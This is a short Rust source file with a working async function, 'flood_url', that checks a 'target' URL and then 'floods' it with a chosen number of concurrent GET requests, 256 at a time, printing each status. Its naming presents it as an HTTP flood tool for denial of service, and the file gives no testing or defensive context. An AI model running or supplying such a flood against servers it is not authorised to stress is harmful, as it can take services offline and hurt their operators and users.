use reqwest::Client;
use std::sync::Arc;
use tokio::sync::Semaphore;

pub async fn flood_url(client: &Client, url: &str, requests: u32) {
    let mut handles = Vec::new();

    let Ok(resp) = client.head(url).send().await else {
        println!("Failed to connect to target");
        return;
    };
    println!("Target check OK [{}], starting flood...", resp.status());

    let concurrency_sem = Arc::new(Semaphore::new(256));

    for _ in 1..=requests {
        let client_clone = client.clone();
        let url_clone = url.to_string();
        let sem_clone = concurrency_sem.clone();
        let handle = tokio::spawn(async move {
            let _permit = sem_clone.acquire().await.unwrap();
            client_clone.get(&url_clone).send().await
        });
        handles.push(handle);
    }

    for handle in handles {
        match handle.await {
            Ok(Ok(resp)) => {
                println!("Status: {}", resp.status());
            }
            Ok(Err(req_err)) => {
                println!("Error: {}", req_err);
            }
            Err(tokio_err) => {
                println!("Network error while flooding: {}", tokio_err);
            }
        }

    }
}




